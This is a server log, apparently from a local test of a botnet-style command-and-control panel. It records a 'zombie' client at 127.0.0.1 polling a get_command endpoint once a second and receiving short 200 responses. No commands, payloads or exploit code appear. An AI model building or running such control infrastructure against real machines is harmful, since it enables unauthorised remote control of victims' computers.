2025-06-25 00:26:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:38 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:39 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:40 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:41 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:42 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:43 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:44 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:45 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:46 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:47 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:48 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:49 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:50 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:51 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:52 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:53 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:54 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:55 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:56 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:57 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:26:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:26:58 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:26:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:26:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:26:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:00 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:01 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:02 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:03 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:04 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:05 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:06 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:07 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:08 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:09 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:10 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:11 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:12 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:13 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:14 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:15 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:16 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:17 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:18 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:19 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:20 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:21 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:22 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:23 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:24 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:25 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:26 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:27 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:28 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0020s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:29 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:30 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
